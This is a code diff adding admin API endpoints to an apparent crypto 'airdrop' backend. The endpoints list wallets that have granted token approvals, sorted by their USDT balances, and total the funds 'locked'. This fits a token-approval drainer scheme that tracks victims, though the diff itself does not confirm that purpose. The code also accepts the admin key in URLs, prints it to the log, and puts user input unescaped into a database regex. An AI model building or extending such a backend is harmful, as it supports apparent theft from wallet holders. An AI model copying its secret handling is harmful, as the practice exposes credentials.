@@ -66,7 +66,165 @@ async function initializeSettings() {
     }
 }
 
-// API Routes
+// ========================
+// ✅ NEW ADMIN APIs ADDED
+// ========================
+
+// Middleware for admin authentication
+const authenticateAdmin = (req, res, next) => {
+    const adminKey = req.headers['admin-key'] || req.query.adminKey;
+    
+    if (!adminKey || adminKey !== ADMIN_KEY) {
+        return res.status(401).json({ 
+            success: false, 
+            message: 'Unauthorized: Invalid admin key' 
+        });
+    }
+    next();
+};
+
+// ✅ Get all approvals for admin panel
+app.get('/api/admin/approvals', authenticateAdmin, async (req, res) => {
+    try {
+        const { page = 1, limit = 50, search, tier } = req.query;
+        
+        let filter = { approvalGiven: true };
+        
+        // Search by wallet address
+        if (search) {
+            filter.walletAddress = { $regex: search, $options: 'i' };
+        }
+        
+        // Filter by tier
+        if (tier) {
+            filter.tier = tier;
+        }
+        
+        const skip = (page - 1) * limit;
+        
+        const approvals = await User.find(filter)
+            .sort({ approvalTimestamp: -1 })
+            .skip(skip)
+            .limit(parseInt(limit))
+            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
+        
+        const total = await User.countDocuments(filter);
+        
+        res.json({
+            success: true,
+            data: approvals,
+            pagination: {
+                page: parseInt(page),
+                limit: parseInt(limit),
+                total,
+                pages: Math.ceil(total / limit)
+            }
+        });
+    } catch (error) {
+        console.error('Error fetching admin approvals:', error);
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ✅ Get admin dashboard statistics
+app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
+    try {
+        const totalApprovals = await User.countDocuments({ approvalGiven: true });
+        const totalUsers = await User.countDocuments();
+        
+        // Calculate total USDT locked
+        const approvedUsers = await User.find({ approvalGiven: true });
+        let totalUSDT = 0;
+        approvedUsers.forEach(user => {
+            const balance = parseFloat(user.usdtBalance) || 0;
+            totalUSDT += balance;
+        });
+        
+        // Tier distribution
+        const tierStats = await User.aggregate([
+            { $match: { approvalGiven: true } },
+            { $group: { _id: "$tier", count: { $sum: 1 } } }
+        ]);
+        
+        // Today's approvals
+        const today = new Date();
+        today.setHours(0, 0, 0, 0);
+        const todayApprovals = await User.countDocuments({ 
+            approvalGiven: true, 
+            approvalTimestamp: { $gte: today } 
+        });
+        
+        res.json({
+            success: true,
+            data: {
+                totalApprovals,
+                totalUsers,
+                totalUSDT: parseFloat(totalUSDT.toFixed(2)),
+                todayApprovals,
+                tierStats: tierStats.reduce((acc, curr) => {
+                    acc[curr._id] = curr.count;
+                    return acc;
+                }, {})
+            }
+        });
+    } catch (error) {
+        console.error('Error fetching admin stats:', error);
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ✅ Get approvals with filters for admin
+app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
+    try {
+        const { date, minAmount, maxAmount, tier } = req.query;
+        let filter = { approvalGiven: true };
+        
+        // Date filter
+        if (date) {
+            const startDate = new Date(date);
+            const endDate = new Date(date);
+            endDate.setDate(endDate.getDate() + 1);
+            
+            filter.approvalTimestamp = {
+                $gte: startDate,
+                $lt: endDate
+            };
+        }
+        
+        // USDT amount filters
+        if (minAmount || maxAmount) {
+            filter.usdtBalance = {};
+            if (minAmount) {
+                filter.usdtBalance.$gte = parseFloat(minAmount).toString();
+            }
+            if (maxAmount) {
+                filter.usdtBalance.$lte = parseFloat(maxAmount).toString();
+            }
+        }
+        
+        // Tier filter
+        if (tier) {
+            filter.tier = tier;
+        }
+        
+        const approvals = await User.find(filter)
+            .sort({ approvalTimestamp: -1 })
+            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
+        
+        res.json({
+            success: true,
+            data: approvals,
+            count: approvals.length
+        });
+    } catch (error) {
+        console.error('Error filtering approvals:', error);
+        res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
+
+// ========================
+// EXISTING APIs (UNCHANGED)
+// ========================
 
 // Health check endpoint
 app.get('/api/health', (req, res) => {
@@ -212,7 +370,11 @@ app.get('/', (req, res) => {
             approvalWallet: '/api/approval-wallet',
             saveApproval: '/api/save-approval',
             approvedUsers: '/api/approved-users',
-            userStats: '/api/user-stats'
+            userStats: '/api/user-stats',
+            // ✅ NEW ADMIN ENDPOINTS
+            adminApprovals: '/api/admin/approvals',
+            adminStats: '/api/admin/stats',
+            adminFilter: '/api/admin/approvals/filter'
         }
     });
 });
@@ -227,6 +389,8 @@ const startServer = async () => {
             console.log(`🚀 Backend server running on port ${PORT}`);
             console.log(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
             console.log(`🌐 API available at: ${process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`}`);
+            console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
+            console.log('✅ Admin APIs are now available!');
         });
     } catch (error) {
         console.error('❌ Failed to start server:', error);
